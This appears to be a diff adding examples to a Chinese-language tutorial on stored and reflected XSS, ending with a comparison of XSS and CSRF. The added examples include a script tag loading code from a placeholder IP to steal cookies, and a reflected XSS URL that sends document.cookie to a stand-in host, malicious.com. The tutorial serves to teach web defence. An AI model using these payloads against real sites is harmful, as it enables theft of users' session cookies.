@@ -124,6 +124,22 @@ XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一�
 
 这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。
 
+#### 例子
+
+论坛中加入
+
+```html
+<script>alert('hello,XSS')</script>
+```
+
+![image](https://galiyy.github.io/images/20191001/20191001173515.png)
+
+```html
+<script src="http://xxx.xxx.xxx.xxx/xxx.js"></script>
+```
+
+可以获取别人cookie，将代码注入目标服务器中
+
 ### 反射型 XSS
 
 反射型 XSS 的攻击步骤：
@@ -140,6 +156,10 @@ XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一�
 由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。
 
 POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。
+
+#### 例子
+
+点击`www.example.com?search=<script>window.location='http://malicious.com/?data=' + document.cookie</script>` 
 
 ### DOM 型 XSS
 
@@ -244,3 +264,10 @@ POST类型的攻击通常比GET要求更加严格一点，但仍并不复杂。�
 - 提交时要求附加本域才能获取的信息
   - CSRF Token
   - 双重Cookie验证
+
+# XSS与CSRF区别
+
+xss：用户过分信任网站，放任来自浏览器地址栏代表的那个网站代码在自己本地任意执行。如果没有浏览器的安全机制限制，xss代码可以在用户浏览器为所欲为；
+
+csrf：网站过分信任用户，放任来自所谓通过访问控制机制的代表合法用户的请求执行网站的某个特定功能。
+
